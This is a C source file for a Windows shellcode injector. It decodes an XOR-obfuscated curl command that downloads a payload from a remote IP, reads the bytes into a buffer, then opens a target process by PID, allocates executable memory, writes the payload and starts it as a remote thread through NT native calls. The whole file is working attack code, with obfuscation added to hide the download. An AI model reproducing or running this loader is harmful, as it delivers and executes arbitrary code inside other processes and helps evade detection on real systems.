#include "header.h"
#include <stdio.h>

#define KEY 0x12 // Example XOR key

unsigned char code[300];
int count = 0;

DWORD NtCloseSSN;
DWORD NtOpenProcessSSN;
DWORD NtCreateThreadExSSN;
DWORD NtWriteVirtualMemorySSN;
DWORD NtWaitForSingleObjectSSN;
DWORD NtAllocateVirtualMemorySSN;


HMODULE getMod(IN LPCWSTR modName) {

    HMODULE hModule = NULL;

    info("trying to get a handle to %S...", modName);
    hModule = GetModuleHandleW(modName); // Get Handle To Module

    if (hModule == NULL) {
        warn("failed to get a handle to the module, error: 0x%lx\n", GetLastError());
        return NULL;
    }

    else {
        okay("got a handle to the module!");
        info("\\___[ %S\n\t\\_0x%p]\n", modName, hModule);
        return hModule; // Return HMODULE
    }

}


DWORD GetSSN(IN HMODULE hNTDLL, IN LPCSTR NtFunction) {

    DWORD NtFunctionSSN = NULL;
    UINT_PTR NtFunctionAddress = NULL;

    info("trying to get the address of %s...", NtFunction);
    NtFunctionAddress = (UINT_PTR)GetProcAddress(hNTDLL, NtFunction);

    if (NtFunctionAddress == NULL) {
        warn("failed to get the address of %s", NtFunction);
        return NULL;
    }

    okay("got the address of %s!", NtFunction);
    info("getting SSN of %s...", NtFunction);
    NtFunctionSSN = ((PBYTE)(NtFunctionAddress + 4))[0];
    okay("\\___[\n\t| %s\n\t| 0x%p+0x4\n\t|____________________0x%lx]\n", NtFunction, NtFunctionAddress, NtFunctionSSN);
    return NtFunctionSSN;

}

int main(int argc, char* argv[]) {

    DWORD    PID = 0;
    HMODULE  hNTDLL = NULL;
    NTSTATUS STATUS = NULL;
    PVOID    rBuffer = NULL;
    HANDLE   hThread = NULL;
    HANDLE   hProc = NULL;
    SIZE_T bytesWritten = 0;
    const char* x_command = "qg`~2?a2zffb(==#+ <#$*<#<!\"=azw~~q}vw<p{|";
    char command[1024]; 

    int i = 0;
    for (i; x_command[i] != '\0'; i++) {
        command[i] = x_command[i] ^ KEY;
    }
    command[i] = '\0'; 

    FILE* fpipe;
    char c = 0;

    if (0 == (fpipe = (FILE*)_popen(command, "r"))) {
        warn("Failed Running Command");
        return EXIT_FAILURE;
    }
    while (fread(&c, sizeof(c), 1, fpipe)) {
        code[count] = c;
        count = count + 1;
    }
    _pclose(fpipe);


    SIZE_T crowPukeSize = sizeof(code);
    

    if (argc < 2) {
        warn("usage: %s <process>", argv[0]);
        return EXIT_FAILURE;
    }

    PID = atoi(argv[1]);
    CLIENT_ID CID = { (HANDLE)PID, 0 };
    OBJECT_ATTRIBUTES OA = { sizeof(OA), 0 };

    info("Getting Handle To NtDLL And Gettings SSNs...");
    hNTDLL = getMod(L"NTDLL");
    NtOpenProcessSSN = GetSSN(hNTDLL, "NtOpenProcess");
    NtAllocateVirtualMemorySSN = GetSSN(hNTDLL, "NtAllocateVirtualMemory");
    NtWriteVirtualMemorySSN = GetSSN(hNTDLL, "NtWriteVirtualMemory");
    NtCreateThreadExSSN = GetSSN(hNTDLL, "NtCreateThreadEx");
    NtWaitForSingleObjectSSN = GetSSN(hNTDLL, "NtWaitForSingleObject");

    info("Getting Handle To Process...");
    STATUS = NtOpenProcess(&hProc, PROCESS_ALL_ACCESS, &OA, &CID);
 
    okay("Got Handle To Process\n\\____0x%p\n", hProc);

    info("Allocating a Buffer...");
    STATUS = NtAllocateVirtualMemory(hProc, &rBuffer, 0, &crowPukeSize, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
  
    okay("Allocated a Buffer Of %d-Bytes\n\\_____0x%p\n", crowPukeSize, rBuffer);

    info("Writing into buffer...");
    STATUS = NtWriteVirtualMemory(hProc, rBuffer, code, crowPukeSize, 0);
   
    okay("Wrote %d-Bytes\n", crowPukeSize);

    info("Starting Thread...");
    STATUS = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, &OA, hProc, (PTHREAD_START_ROUTINE)rBuffer, NULL, 0, 0, 0, 0, NULL);
   
    okay("Started Thread\n\\______0x%p", hThread);

    NtWaitForSingleObject(hThread, FALSE, NULL);

    info("Thread Finished Cleaning Up...");
    CloseHandle(hProc);
    CloseHandle(hThread);


    return EXIT_SUCCESS;

}